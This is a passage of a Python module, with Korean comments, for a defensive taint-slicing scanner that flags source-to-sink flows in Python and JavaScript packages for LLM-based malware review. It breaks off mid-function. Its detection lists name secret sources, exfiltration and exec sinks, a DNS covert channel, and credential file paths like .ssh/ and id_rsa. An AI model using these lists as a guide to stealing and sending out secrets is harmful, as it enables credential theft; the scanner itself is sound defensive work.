"""
Taint Slicing 간이 버전.

근거 논문:
  Taint-Based Code Slicing for LLMs-based Malicious NPM Package Detection (2025)
  https://arxiv.org/html/2512.12313

목적:
  - LLM 에 전체 코드를 넘기는 비용/잡음 줄이기
  - "민감 source -> sink" 데이터 플로우만 추출해 prompt 토큰 수 절감
  - source: 민감 정보 (env, fs.read, secrets)
  - sink:   외부 송출/실행 (http, exec, subprocess)

본 구현은 단순화된 휴리스틱 기반:
  - Python AST 기반 변수 → 호출 흐름 추적
  - 한 함수 / 한 모듈 내에서 source 의 결과가
    sink 인자로 흘러 들어가는지 확인
"""
from __future__ import annotations

import ast
from dataclasses import dataclass, field

from .stage1_entry_point import EntryFile

# ─────────────────── source / sink 정의 ───────────────────

# source 함수 호출 (이 결과가 변수에 담기면 tainted)
TAINT_SOURCES = {
    # 환경변수
    "os.environ.get", "os.environ.__getitem__", "os.getenv",
    # 자격증명/비밀
    "getpass.getuser", "getpass.getpass",
    # 파일 읽기
    "open", "io.open", "Path.read_text", "Path.read_bytes",
    "fs.readFileSync", "fs.readFile",
    # 시스템 정보
    "platform.uname", "socket.gethostname", "os.uname",
    # subprocess output
    "subprocess.check_output", "subprocess.getoutput",
    # process.env (JS — 단순화)
    "process.env",
}

# sink 함수 호출 (taint 가 인자로 들어가면 위험)
TAINT_SINKS = {
    # 네트워크 송신
    "requests.post", "requests.put", "requests.patch",
    "urllib.request.urlopen", "urllib.request.Request",
    "http.client.HTTPSConnection",
    "httpx.post", "httpx.put",
    "socket.send", "socket.sendto",
    # 코드 실행
    "exec", "eval", "compile",
    "subprocess.run", "subprocess.Popen", "subprocess.call",
    "os.system", "os.popen",
    # 역직렬화 RCE (untrusted 입력 시 코드 실행과 동등)
    "pickle.loads", "marshal.loads",
    "yaml.load",  # SafeLoader 미지정 시 RCE
    # DNS covert channel — gethostbyname 의 인자가 secret 을 포함하면 DNS 송출
    "socket.gethostbyname", "socket.gethostbyname_ex",
    # JS sinks (단순)
    "fetch", "axios.post", "http.request", "https.request",
    "child_process.exec", "child_process.spawn",
}

# 데이터 변환 단계 (taint propagate)
TAINT_TRANSFORMS = {
    "base64.b64encode", "base64.b64decode",
    "json.dumps", "json.loads",
    "str", "bytes", "encode", "decode",
    "Buffer.from", "atob", "btoa",
}


# ─────────────────── 결과 ───────────────────

@dataclass
class TaintFlow:
    """source 에서 sink 까지의 단일 흐름."""
    source_call: str
    source_line: int
    sink_call: str
    sink_line: int
    tainted_var: str             # 추적된 변수명
    transforms: list[str] = field(default_factory=list)  # 거친 변환들
    file_path: str = ""

    def to_summary(self) -> str:
        chain = [self.source_call] + self.transforms + [self.sink_call]
        return " -> ".join(chain)

    def to_dict(self) -> dict:
        return {
            "source_call": self.source_call,
            "source_line": self.source_line,
            "sink_call": self.sink_call,
            "sink_line": self.sink_line,
            "tainted_var": self.tainted_var,
            "transforms": list(self.transforms),
            "file_path": self.file_path,
        }

    @classmethod
    def from_dict(cls, d: dict) -> TaintFlow:
        return cls(
            source_call=d["source_call"],
            source_line=int(d.get("source_line", 0)),
            sink_call=d["sink_call"],
            sink_line=int(d.get("sink_line", 0)),
            tainted_var=d.get("tainted_var", ""),
            transforms=list(d.get("transforms", [])),
            file_path=d.get("file_path", ""),
        )


@dataclass
class TaintReport:
    flows: list[TaintFlow] = field(default_factory=list)
    error: str | None = None

    def to_dict(self) -> dict:
        return {
            "flows": [f.to_dict() for f in self.flows],
            "error": self.error,
        }

    @classmethod
    def from_dict(cls, d: dict) -> TaintReport:
        return cls(
            flows=[TaintFlow.from_dict(f) for f in d.get("flows", [])],
            error=d.get("error"),
        )


# ─────────────────── Python AST taint ───────────────────

class _PyTaintAnalyzer(ast.NodeVisitor):
    """함수/모듈 단위 taint 추적.

    매우 단순한 휴리스틱:
      1. Assign 노드에서 RHS 가 source 호출이면 LHS 변수를 tainted 로 표시
      2. Call 인자로 tainted 변수가 들어가면 전파 (transform)
      3. sink 호출 인자로 tainted 변수가 들어가면 flow 기록
    """

    def __init__(self):
        # 변수명 → 마지막으로 흐른 source 정보
        self.tainted: dict[str, dict] = {}
        self.flows: list[TaintFlow] = []
        # 변수명 → 모듈명 alias (1단계 추적)
        # 예: `m = __import__("subprocess")` → {"m": "subprocess"}
        self.module_aliases: dict[str, str] = {}

    def _resolve_call_name(self, node) -> str | None:
        if isinstance(node, ast.Name):
            # Name 자체는 alias 풀지 않음 (변수명 그대로). alias 풀기는
            # Attribute 단계에서 — `m.run` 의 base = `m` → alias 'subprocess'
            return node.id
        if isinstance(node, ast.Attribute):
            base = self._resolve_call_name(node.value)
            if base:
                # alias 가 등록된 변수면 → 모듈명으로 평탄화
                if base in self.module_aliases:
                    base = self.module_aliases[base]
                return f"{base}.{node.attr}"
            return node.attr
        if isinstance(node, ast.Call):
            # 난독화 패턴: __import__("subprocess").check_output(...)
            # __import__("subprocess") 부분을 'subprocess' 로 평탄화
            inner = node.func
            if (
                isinstance(inner, ast.Name)
                and inner.id == "__import__"
                and node.args
                and isinstance(node.args[0], ast.Constant)
                and isinstance(node.args[0].value, str)
            ):
                return node.args[0].value
            # importlib.import_module("subprocess") 도 동일 처리
            if (
                isinstance(inner, ast.Attribute)
                and inner.attr == "import_module"
                and node.args
                and isinstance(node.args[0], ast.Constant)
                and isinstance(node.args[0].value, str)
            ):
                return node.args[0].value
        return None

    def _collect_names_in_expr(self, node) -> list[str]:
        """단일 표현식에서 사용된 변수명을 재귀로 수집.

        지원 형태:
          - Name              : x
          - Attribute         : obj.attr (root Name 만 수집)
          - Call              : f(args)  / x.method(args) — args, func.value 모두 검사
          - BinOp             : a + b
          - Starred           : *args
          - JoinedStr         : f"..{x}.."
          - Subscript         : x[k]
          - Tuple/List/Set    : (x, y, ...)
          - IfExp             : a if cond else b
        """
        names: list[str] = []
        if node is None:
            return names

        if isinstance(node, ast.Name):
            names.append(node.id)
        elif isinstance(node, ast.Attribute):
            base = self._resolve_call_name(node)
            if base:
                names.append(base.split(".")[0])
        elif isinstance(node, ast.Call):
            for a in node.args:
                names.extend(self._collect_names_in_expr(a))
            if isinstance(node.func, ast.Attribute):
                # 메서드 호출 형태: receiver.method(...) — receiver 추적
                names.extend(self._collect_names_in_expr(node.func.value))
        elif isinstance(node, ast.BinOp):
            names.extend(self._collect_names_in_expr(node.left))
            names.extend(self._collect_names_in_expr(node.right))
        elif isinstance(node, ast.Starred):
            names.extend(self._collect_names_in_expr(node.value))
        elif isinstance(node, ast.JoinedStr):
            for v in node.values:
                if isinstance(v, ast.FormattedValue):
                    names.extend(self._collect_names_in_expr(v.value))
        elif isinstance(node, ast.Subscript):
            names.extend(self._collect_names_in_expr(node.value))
        elif isinstance(node, (ast.Tuple, ast.List, ast.Set)):
            for elt in node.elts:
                names.extend(self._collect_names_in_expr(elt))
        elif isinstance(node, ast.IfExp):
            names.extend(self._collect_names_in_expr(node.body))
            names.extend(self._collect_names_in_expr(node.orelse))
        return names

    def _collect_var_names_in_args(self, args) -> list[str]:
        names: list[str] = []
        for a in args:
            names.extend(self._collect_names_in_expr(a))
        return names

    def visit_Assign(self, node: ast.Assign):
        """`var = source_call(...)` / `var = transform(other_var)` /
        `var = __import__("module")`  (alias 등록)"""
        if len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
            target = node.targets[0].id

            # ─── alias 등록: var = __import__("X") / importlib.import_module("X") ───
            if isinstance(node.value, ast.Call):
                inner = node.value.func
                if (
                    isinstance(inner, ast.Name)
                    and inner.id == "__import__"
                    and node.value.args
                    and isinstance(node.value.args[0], ast.Constant)
                    and isinstance(node.value.args[0].value, str)
                ):
                    self.module_aliases[target] = node.value.args[0].value
                elif (
                    isinstance(inner, ast.Attribute)
                    and inner.attr == "import_module"
                    and node.value.args
                    and isinstance(node.value.args[0], ast.Constant)
                    and isinstance(node.value.args[0].value, str)
                ):
                    self.module_aliases[target] = node.value.args[0].value

            if isinstance(node.value, ast.Call):
                callee = self._resolve_call_name(node.value.func)
                if callee in TAINT_SOURCES:
                    self.tainted[target] = {
                        "source": callee,
                        "line": getattr(node, "lineno", 0),
                        "transforms": [],
                    }
                elif callee in TAINT_TRANSFORMS or (callee and callee.endswith((".encode", ".decode")) ):
                    # 변환 — 입력 인자가 tainted 면 출력도 tainted
                    arg_names = self._collect_var_names_in_args(node.value.args)
                    for name in arg_names:
                        if name in self.tainted:
                            info = dict(self.tainted[name])
                            info["transforms"] = info["transforms"] + [callee]
                            self.tainted[target] = info
                            break

            # 단순 변수 할당 var2 = var1
            elif isinstance(node.value, ast.Name) and node.value.id in self.tainted:
                self.tainted[target] = self.tainted[node.value.id]

        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        callee = self._resolve_call_name(node.func)
        if callee in TAINT_SINKS:
            arg_names = self._collect_var_names_in_args(node.args)
            # keyword 인자도 검사
            for kw in node.keywords:
                if isinstance(kw.value, ast.Name):
                    arg_names.append(kw.value.id)
                elif isinstance(kw.value, ast.Dict):
                    for v in kw.value.values:
                        if isinstance(v, ast.Name):
                            arg_names.append(v.id)
            for name in arg_names:
                if name in self.tainted:
                    info = self.tainted[name]
                    self.flows.append(TaintFlow(
                        source_call=info["source"],
                        source_line=info["line"],
                        sink_call=callee,
                        sink_line=getattr(node, "lineno", 0),
                        tainted_var=name,
                        transforms=info["transforms"],
                    ))
                    break
        self.generic_visit(node)


def analyze_python(source: str) -> TaintReport:
    report = TaintReport()
    try:
        tree = ast.parse(source)
    except SyntaxError as e:
        report.error = f"SyntaxError: {e}"
        return report

    analyzer = _PyTaintAnalyzer()
    analyzer.visit(tree)
    report.flows = analyzer.flows
    return report


# ─────────────────── 통합 ───────────────────

def analyze_file(f: EntryFile) -> TaintReport:
    if f.language == "python":
        rpt = analyze_python(f.content)
        for flow in rpt.flows:
            flow.file_path = f.path
        return rpt
    if f.language == "javascript":
        # 1) 파일 자체의 module-level tainted 변수 (process.env / fs.read 등) 추출
        # 2) _js_emit_flows 에 seed 로 전달 → within-file source→sink 흐름 emit
        # cross-file analyzer 의 import-seed 로직 없이 단일 파일 흐름만 잡음.
        try:
            module_taints, _exports = _js_module_level_taints_and_exports(f.content)
            flows = _js_emit_flows(f.content, module_taints, f.path)
            return TaintReport(flows=flows)
        except Exception as e:
            return TaintReport(error=f"js parse error: {e}")
    return TaintReport()


# ─────────────────── 모듈 간 (cross-file) ───────────────────

def _path_to_module(path: str) -> str | None:
    """소스 경로 → 도트 경로. `src/foo/bar.py` → `foo.bar`.

    아카이브 prefix(<pkg>-<ver>/) 도 시도해서 떼어 본다. `__init__.py` 는
    디렉터리 모듈로 간주.
    """
    p = path.replace("\\", "/")
    if not p.endswith(".py"):
        return None
    p = p[: -len(".py")]
    parts = [s for s in p.split("/") if s and s not in ("src",)]
    # 패키지 표준 prefix 제거 (foo-1.2/, package/)
    if parts and ("-" in parts[0] or parts[0] == "package"):
        parts = parts[1:]
    if not parts:
        return None
    if parts[-1] == "__init__":
        parts = parts[:-1]
    if not parts:
        return None
    return ".".join(parts)


def _collect_module_level_taints(source: str) -> dict[str, dict]:
    """모듈 레벨 (top-level Assign) 에서 source 호출로 받은 변수만 추출.

    반환: {var_name: {"source": str, "line": int, "transforms": [...]}}
    """
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return {}
    analyzer = _PyTaintAnalyzer()
    # ast.Module 의 직접 body 만 본다 — 함수 안쪽은 모듈 외부에서 접근 불가
    for node in tree.body:
        analyzer.visit(node)
    # tainted dict 가 모듈 attribute 노출 후보
    return dict(analyzer.tainted)


def analyze_python_cross_file(
    sources: dict[str, str],
) -> dict[str, TaintReport]:
    """모듈 간 taint 전파를 포함한 다중 파일 분석.

    동작:
      1. 1차 패스 — 각 파일의 모듈-레벨 tainted 변수 수집 → exports 테이블.
      2. 2차 패스 — 각 파일에서 `from <X> import <Y>` 발견 시
         X 가 위 exports 테이블에 있고 Y 가 그 모듈의 tainted 변수면
         Y 를 현재 파일 분석기의 초기 tainted 로 주입.
      3. 같은 분석기로 visit → cross-file flow 가 일반 flow 와 동일하게 기록.

    한계:
      - 모듈 객체 export (`from . import config; config.SECRET`) 미지원.
      - 상대 import 는 path → module 변환 결과의 끝 부분 매칭으로 best-effort.
      - 순환 import 는 1-단계만 전파 (의도적).
    """
    # ── 1) 각 파일의 모듈명 + 모듈-레벨 taint exports ──
    file_module: dict[str, str] = {}   # path → module-dot-path
    module_exports: dict[str, dict[str, dict]] = {}  # module → {var: source_info}
    module_file: dict[str, str] = {}   # module → path (for flow.file_path)
    for path, src in sources.items():
        mod = _path_to_module(path)
        if mod is None:
            continue
        file_module[path] = mod
        exports = _collect_module_level_taints(src)
        if exports:
            module_exports[mod] = exports
            module_file[mod] = path

    # ── 2) 각 파일을 분석하면서 ImportFrom 으로 외부 모듈의 taint 주입 ──
    reports: dict[str, TaintReport] = {}
    for path, src in sources.items():
        try:
            tree = ast.parse(src)
        except SyntaxError as e:
            reports[path] = TaintReport(error=f"SyntaxError: {e}")
            continue

        analyzer = _PyTaintAnalyzer()

        # ImportFrom 노드를 먼저 훑어 외부 모듈에서 tainted 이름 가져오기
        for node in ast.walk(tree):
            if not isinstance(node, ast.ImportFrom):
                continue
            if not node.module:
                continue
            target_mod = node.module
            # 정확 일치 우선
            exports = module_exports.get(target_mod)
            # 차선: 같은 패키지 안 상대 경로 (`from .config import X`)
            # → 현재 파일의 module 의 부모 + node.module 비교
            if exports is None and path in file_module:
                cur_mod = file_module[path]
                # 정확히 같지 않더라도 끝 부분 매칭
                for mod_name, mod_taints in module_exports.items():
                    if mod_name.endswith("." + target_mod) or mod_name == target_mod:
                        exports = mod_taints
                        break
            if not exports:
                continue
            for alias in node.names:
                origin_name = alias.name
                local_name = alias.asname or alias.name
                if origin_name in exports:
                    info = dict(exports[origin_name])
                    # cross-file marker: file_path 를 source 모듈 파일로 기록
                    # — slice_for_llm 이 호출자 파일을 우선 보고, source_call 에 origin 모듈 표기
                    src_origin = info.get("source", "")
                    src_file = module_file.get(target_mod, "")
                    transforms = list(info.get("transforms", []))
                    if src_file and src_file != path:
                        transforms = [f"<cross-file from {src_file}>"] + transforms
                    analyzer.tainted[local_name] = {
                        "source": src_origin,
                        "line": info.get("line", 0),
                        "transforms": transforms,
                    }

        analyzer.visit(tree)
        rpt = TaintReport(flows=analyzer.flows)
        for flow in rpt.flows:
            flow.file_path = path
        reports[path] = rpt

    return reports


_JS_SECRET_PATH_HINTS = (".aws/", ".ssh/", "credentials", ".env", "id_rsa", "secrets")

# JS sink 호출 이름 (member_expression 평탄화 결과 기준)
_JS_SINK_NAMES = {
    "fetch",
    "axios.post", "axios.put", "axios.patch", "axios.get", "axios",
    "http.request", "https.request",
    "child_process.exec", "child_process.execSync",
    "child_process.spawn", "child_process.spawnSync",
    "eval", "Function",
}

# JS taint propagate transforms
_JS_TRANSFORMS = {
    "Buffer.from", "JSON.stringify", "JSON.parse",
    "atob", "btoa", "encodeURIComponent", "decodeURIComponent",
    "String", "Number",
}


def _js_parser():
    """Lazy import — tree-sitter-javascript 가 없으면 None."""
    try:
        from .js_ast_parser import _get_parser  # type: ignore
        return _get_parser()
    except Exception:
        return None


def _js_text(node, src: bytes) -> str:
    return src[node.start_byte:node.end_byte].decode("utf-8", errors="replace")


def _js_resolve_member(node, src: bytes) -> str | None:
    """member_expression / identifier → 'a.b.c' 평탄화."""
    if node is None:
        return None
    t = node.type
    if t == "identifier" or t == "property_identifier":
        return _js_text(node, src)
    if t == "member_expression":
        obj = node.child_by_field_name("object")
        prop = node.child_by_field_name("property")
        if prop is None:
            return None
        prop_text = _js_text(prop, src)
        obj_text = _js_resolve_member(obj, src) if obj else None
        if obj_text is None:
            return prop_text
        return f"{obj_text}.{prop_text}"
    if t == "subscript_expression":
        # process.env['SECRET'] 같은 경우 — object 만 평탄화 시도
        obj = node.child_by_field_name("object")
        return _js_resolve_member(obj, src) if obj else None
    return None


def _js_is_taint_source(value_node, src: bytes) -> str | None:
    """RHS 표현식이 taint source 이면 source 이름 반환, 아니면 None.

    인식 패턴:
      - process.env.X / process.env['X']
      - fs.readFileSync(path)  / fs.readFile(path)  with secret-looking path
    """
    if value_node is None:
        return None
    t = value_node.type
    if t == "member_expression" or t == "subscript_expression":
        name = _js_resolve_member(value_node, src)
        if name and (name == "process.env" or name.startswith("process.env.")):
            return "process.env"
        return None
    if t == "call_expression":
        func = value_node.child_by_field_name("function")
        callee = _js_resolve_member(func, src) if func else None
        if callee in ("fs.readFileSync", "fs.readFile"):
            args = value_node.child_by_field_name("arguments")
            if args is not None:
                for child in args.children:
                    if child.type == "string":
                        path_str = _js_text(child, src).strip("'\"`")
                        low = path_str.lower()
                        if any(h in low for h in _JS_SECRET_PATH_HINTS):
                            return callee
        return None
    return None


def _js_module_level_taints_and_exports(source: str) -> tuple[dict[str, dict], dict[str, str]]:
    """모듈-레벨 taint 변수 + export 매핑 추출.

    Returns:
      - tainted: {local_var: {source, line, transforms}}
      - exports: {exported_name: local_var}   (export name → 모듈 내부 변수명)
    """
    parser = _js_parser()
    if parser is None:
        return {}, {}
    src_bytes = source.encode("utf-8")
    tree = parser.parse(src_bytes)
    root = tree.root_node

    tainted: dict[str, dict] = {}
    exports: dict[str, str] = {}

    def _scan_declarator(decl, in_export: bool):
        """variable_declarator 한 개."""
        name_node = decl.child_by_field_name("name")
        value_node = decl.child_by_field_name("value")
        if name_node is None:
            return
        if name_node.type == "identifier":
            local = _js_text(name_node, src_bytes)
            src_name = _js_is_taint_source(value_node, src_bytes)
            if src_name:
                tainted[local] = {
                    "source": src_name,
                    "line": (decl.start_point[0] + 1),
                    "transforms": [],
                }
            if in_export:
                exports[local] = local

    # 모듈 top-level 만 순회 — 함수 본문은 외부에서 접근 불가
    for stmt in root.children:
        st = stmt.type

        if st == "lexical_declaration" or st == "variable_declaration":
            for c in stmt.children:
                if c.type == "variable_declarator":
                    _scan_declarator(c, in_export=False)

        elif st == "export_statement":
            # export const X = ... / export { Y } / export default ...
            for c in stmt.children:
                if c.type in ("lexical_declaration", "variable_declaration"):
                    for d in c.children:
                        if d.type == "variable_declarator":
                            _scan_declarator(d, in_export=True)
                elif c.type == "export_clause":
                    # export { A, B as Bb }
                    for spec in c.children:
                        if spec.type == "export_specifier":
                            name = spec.child_by_field_name("name")
                            alias = spec.child_by_field_name("alias")
                            if name is not None:
                                local_name = _js_text(name, src_bytes)
                                exported_as = (
                                    _js_text(alias, src_bytes) if alias else local_name
                                )
                                exports[exported_as] = local_name

        elif st == "expression_statement":
            # module.exports = { A, B } / module.exports.X = local / exports.X = local
            inner = stmt.children[0] if stmt.children else None
            if inner is None or inner.type != "assignment_expression":
                continue
            left = inner.child_by_field_name("left")
            right = inner.child_by_field_name("right")
            left_name = _js_resolve_member(left, src_bytes) if left else None
            if left_name == "module.exports" and right is not None and right.type == "object":
                for p in right.children:
                    if p.type == "shorthand_property_identifier":
                        n = _js_text(p, src_bytes)
                        exports[n] = n
                    elif p.type == "pair":
                        key = p.child_by_field_name("key")
                        val = p.child_by_field_name("value")
                        if key is not None and val is not None and val.type == "identifier":
                            exports[_js_text(key, src_bytes)] = _js_text(val, src_bytes)
            elif left_name and (
                left_name.startswith("module.exports.") or left_name.startswith("exports.")
            ):
                exported_as = left_name.split(".")[-1]
                if right is not None and right.type == "identifier":
                    exports[exported_as] = _js_text(right, src_bytes)
                else:
                    # 직접 source 표현식을 export 에 박은 경우: exports.X = process.env.Y
                    src_name = _js_is_taint_source(right, src_bytes) if right else None
                    if src_name:
                        synthetic = f"__export_{exported_as}"
                        tainted[synthetic] = {
                            "source": src_name,
                            "line": (stmt.start_point[0] + 1),
                            "transforms": [],
                        }
                        exports[exported_as] = synthetic

    return tainted, exports


def _js_path_to_key(path: str) -> str:
    """경로 정규화 — '\\' → '/' 만."""
    return path.replace("\\", "/")


def _js_resolve_import(spec: str, importer_path: str, sources: dict[str, str]) -> str | None:
    """import specifier 를 sources dict 의 키로 매칭.

    - 상대 경로: importer 디렉터리 기준으로 resolve
    - 절대/패키지 경로: basename 매칭 fallback
    - .js / .mjs / .cjs / index.js 시도
    """
    importer = _js_path_to_key(importer_path)
    importer_dir = importer.rsplit("/", 1)[0] if "/" in importer else ""

    candidates: list[str] = []
    if spec.startswith("./") or spec.startswith("../") or spec.startswith("/"):
        # 상대 경로
        if spec.startswith("/"):
            base = spec.lstrip("/")
        else:
            base = (importer_dir + "/" + spec) if importer_dir else spec
        # 정규화 (.. 처리)
        parts: list[str] = []
        for seg in base.split("/"):
            if seg == "" or seg == ".":
                continue
            if seg == "..":
                if parts:
                    parts.pop()
                continue
            parts.append(seg)
        joined = "/".join(parts)
        candidates += [
            joined,
            joined + ".js", joined + ".mjs", joined + ".cjs",
            joined + "/index.js",
        ]
    else:
        # 패키지/절대명 → basename 매칭
        base = spec.split("/")[-1]
        candidates += [
            spec, spec + ".js",
            base, base + ".js", base + "/index.js",
        ]

    # sources 키와 매칭 — 정확/접미 매칭
    keys = {_js_path_to_key(k): k for k in sources.keys()}
    for cand in candidates:
        if cand in keys:
            return keys[cand]
    # suffix 매칭 (best-effort)
    for cand in candidates:
        for norm, orig in keys.items():
            if norm.endswith("/" + cand) or norm == cand:
                return orig
    return None


def _js_scan_imports(source: str) -> list[dict]:
    """import / require 호출을 모듈-레벨에서 추출.

    각 항목: {"module": str, "bindings": [(origin_name, local_name), ...]}
    """
    parser = _js_parser()
    if parser is None:
        return []
    src_bytes = source.encode("utf-8")
    tree = parser.parse(src_bytes)
    root = tree.root_node
    out: list[dict] = []

    def _extract_string(node) -> str | None:
        for c in node.children:
            if c.type == "string":
                return _js_text(c, src_bytes).strip("'\"`")
            sub = _extract_string(c)
            if sub:
                return sub
        return None

    for stmt in root.children:
        if stmt.type == "import_statement":
            # source 문자열
            mod_str = None
            clause = None
            for c in stmt.children:
                if c.type == "string":
                    mod_str = _js_text(c, src_bytes).strip("'\"`")
                elif c.type == "import_clause":
                    clause = c
            if mod_str is None:
                continue
            bindings: list[tuple[str, str]] = []
            if clause is not None:
                for cc in clause.children:
                    if cc.type == "identifier":
                        # default import → import D from 'x'
                        bindings.append(("default", _js_text(cc, src_bytes)))
                    elif cc.type == "named_imports":
                        for spec in cc.children:
                            if spec.type == "import_specifier":
                                name_node = spec.child_by_field_name("name")
                                alias_node = spec.child_by_field_name("alias")
                                if name_node is not None:
                                    origin = _js_text(name_node, src_bytes)
                                    local = (
                                        _js_text(alias_node, src_bytes)
                                        if alias_node else origin
                                    )
                                    bindings.append((origin, local))
            out.append({"module": mod_str, "bindings": bindings})

        elif stmt.type in ("lexical_declaration", "variable_declaration"):
            for d in stmt.children:
                if d.type != "variable_declarator":
                    continue
                name_node = d.child_by_field_name("name")
                value_node = d.child_by_field_name("value")
                if value_node is None:
                    continue
                # const X = require('y')                  → default-ish (whole module)
                # const { A, B } = require('y')           → named
                # const C = require('y').D                → renamed
                call_node = None
                trailing_prop = None
                if value_node.type == "call_expression":
                    call_node = value_node
                elif value_node.type == "member_expression":
                    obj = value_node.child_by_field_name("object")
                    prop = value_node.child_by_field_name("property")
                    if obj is not None and obj.type == "call_expression" and prop is not None:
                        call_node = obj
                        trailing_prop = _js_text(prop, src_bytes)
                if call_node is None:
                    continue
                func = call_node.child_by_field_name("function")
                if func is None or _js_text(func, src_bytes) != "require":
                    continue
                args = call_node.child_by_field_name("arguments")
                mod_str = None
                if args is not None:
                    for c in args.children:
                        if c.type == "string":
                            mod_str = _js_text(c, src_bytes).strip("'\"`")
                            break
                if mod_str is None:
                    continue

                bindings: list[tuple[str, str]] = []
                if name_node is None:
                    pass
                elif name_node.type == "identifier":
                    local = _js_text(name_node, src_bytes)
                    if trailing_prop:
                        bindings.append((trailing_prop, local))
                    else:
                        bindings.append(("default", local))
                elif name_node.type == "object_pattern":
                    for p in name_node.children:
                        if p.type == "shorthand_property_identifier_pattern":
                            n = _js_text(p, src_bytes)
                            bindings.append((n, n))
                        elif p.type == "pair_pattern":
                            key = p.child_by_field_name("key")
                            val = p.child_by_field_name("value")
                            if key is not None and val is not None and val.type == "identifier":
                                bindings.append((_js_text(key, src_bytes), _js_text(val, src_bytes)))
                if bindings:
                    out.append({"module": mod_str, "bindings": bindings})

    return out


def _js_emit_flows(source: str, initial_tainted: dict[str, dict], path: str) -> list[TaintFlow]:
    """한 JS 파일을 분석 — 초기 tainted 를 받아서 sink 호출까지의 flow 만 만든다.

    매우 단순화:
      - top-level + 모든 함수 본문을 한 묶음으로 보고 변수 흐름 추적 (scope 무시).
      - assignment / variable_declarator / call_expression 만 본다.
    """
    parser = _js_parser()
    if parser is None:
        return []
    src_bytes = source.encode("utf-8")
    tree = parser.parse(src_bytes)

    tainted: dict[str, dict] = dict(initial_tainted)
    flows: list[TaintFlow] = []

    def _names_in_expr(node) -> list[str]:
        if node is None:
            return []
        t = node.type
        out: list[str] = []
        if t == "identifier":
            out.append(_js_text(node, src_bytes))
            return out
        if t == "member_expression":
            obj = node.child_by_field_name("object")
            if obj is not None:
                out.extend(_names_in_expr(obj))
            return out
        if t == "subscript_expression":
            obj = node.child_by_field_name("object")
            if obj is not None:
                out.extend(_names_in_expr(obj))
            return out
        # call / template / binary / object / array → 재귀
        for c in node.children:
            out.extend(_names_in_expr(c))
        return out

    def _handle_declarator(decl):
        name_node = decl.child_by_field_name("name")
        value_node = decl.child_by_field_name("value")
        if name_node is None or name_node.type != "identifier" or value_node is None:
            return
        target = _js_text(name_node, src_bytes)
        # transform 호출?
        if value_node.type == "call_expression":
            func = value_node.child_by_field_name("function")
            callee = _js_resolve_member(func, src_bytes) if func else None
            if callee in _JS_TRANSFORMS:
                args = value_node.child_by_field_name("arguments")
                arg_names = _names_in_expr(args) if args else []
                for nm in arg_names:
                    if nm in tainted:
                        info = dict(tainted[nm])
                        info["transforms"] = info["transforms"] + [callee]
                        tainted[target] = info
                        return
        elif value_node.type == "identifier":
            nm = _js_text(value_node, src_bytes)
            if nm in tainted:
                tainted[target] = tainted[nm]

    def _handle_call(call_node):
        func = call_node.child_by_field_name("function")
        if func is None:
            return
        callee = _js_resolve_member(func, src_bytes)
        if callee not in _JS_SINK_NAMES:
            return
        args = call_node.child_by_field_name("arguments")
        if args is None:
            return
        arg_names = _names_in_expr(args)
        for nm in arg_names:
            if nm in tainted:
                info = tainted[nm]
                flows.append(TaintFlow(
                    source_call=info["source"],
                    source_line=info["line"],
                    sink_call=callee,
                    sink_line=(call_node.start_point[0] + 1),
                    tainted_var=nm,
                    transforms=list(info["transforms"]),
                    file_path=path,
                ))
                break

    def _walk(node):
        t = node.type
        if t == "variable_declarator":
            _handle_declarator(node)
        elif t == "assignment_expression":
            left = node.child_by_field_name("left")
            right = node.child_by_field_name("right")
            if left is not None and left.type == "identifier" and right is not None:
                target = _js_text(left, src_bytes)
                if right.type == "identifier":
                    nm = _js_text(right, src_bytes)
                    if nm in tainted:
                        tainted[target] = tainted[nm]
                elif right.type == "call_expression":
                    rfunc = right.child_by_field_name("function")
                    rcallee = _js_resolve_member(rfunc, src_bytes) if rfunc else None
                    if rcallee in _JS_TRANSFORMS:
                        rargs = right.child_by_field_name("arguments")
                        for nm in (_names_in_expr(rargs) if rargs else []):
                            if nm in tainted:
                                info = dict(tainted[nm])
                                info["transforms"] = info["transforms"] + [rcallee]
                                tainted[target] = info
                                break
        elif t == "call_expression":
            _handle_call(node)
        for c in node.children:
            _walk(c)

    _walk(tree.root_node)
    return flows


def analyze_javascript_cross_file(
    sources: dict[str, str],
) -> dict[str, TaintReport]:
    """JS 모듈 간 taint 전파 분석. `analyze_python_cross_file` 의 JS 대응.

    동작:
      1. 1차 패스 — 각 .js 파일에서 모듈-레벨 taint 변수 + export 매핑 수집.
      2. 2차 패스 — 각 파일에서 import / require 의 대상이
         sources 안의 어떤 파일을 가리키는지 resolve 하고, 가져온 이름이
         그 모듈의 export 이고 export 가 가리키는 로컬 변수가 tainted 면
         현재 파일의 초기 tainted dict 에 주입.
      3. 같은 파일에서 sink 호출 인자에 그 이름이 들어가면 cross-file flow 기록.

    한계:
      - 모듈 객체 전체 import 후 멤버 접근 (`const c = require('./c'); c.SECRET`)
        은 미지원 — 단, `c.SECRET` 형태로 sink 인자에 직접 들어가면 잡지 못함.
      - dynamic import / re-export / default 객체 propagate 미지원.
      - tree-sitter-javascript 가 없으면 빈 결과 반환.
    """
    parser = _js_parser()
    if parser is None:
        return {p: TaintReport(error="tree-sitter-javascript unavailable")
                for p in sources}

    # ── 1) 모듈-레벨 taint + export 테이블 ──
    file_taints: dict[str, dict[str, dict]] = {}
    file_exports: dict[str, dict[str, str]] = {}
    for path, src in sources.items():
        try:
            taints, exports = _js_module_level_taints_and_exports(src)
        except Exception:
            taints, exports = {}, {}
        file_taints[path] = taints
        file_exports[path] = exports

    # ── 2) 각 파일에서 import resolve → 초기 tainted 주입 → flow 추출 ──
    reports: dict[str, TaintReport] = {}
    for path, src in sources.items():
        initial: dict[str, dict] = {}
        try:
            imports = _js_scan_imports(src)
        except Exception as e:
            reports[path] = TaintReport(error=f"js parse error: {e}")
            continue

        for imp in imports:
            target_path = _js_resolve_import(imp["module"], path, sources)
            if target_path is None or target_path == path:
                continue
            target_exports = file_exports.get(target_path, {})
            target_taints = file_taints.get(target_path, {})
            for origin, local in imp["bindings"]:
                # origin == 'default' 이거나 정확히 export 이름이거나
                local_var_in_target = target_exports.get(origin)
                if local_var_in_target is None:
                    # default import or unmatched — skip
                    continue
                info = target_taints.get(local_var_in_target)
                if info is None:
                    continue
                transforms = list(info.get("transforms", []))
                if target_path != path:
                    transforms = [f"<cross-file from {target_path}>"] + transforms
                initial[local] = {
                    "source": info["source"],
                    "line": info.get("line", 0),
                    "transforms": transforms,
                }

        try:
            flows = _js_emit_flows(src, initial, path)
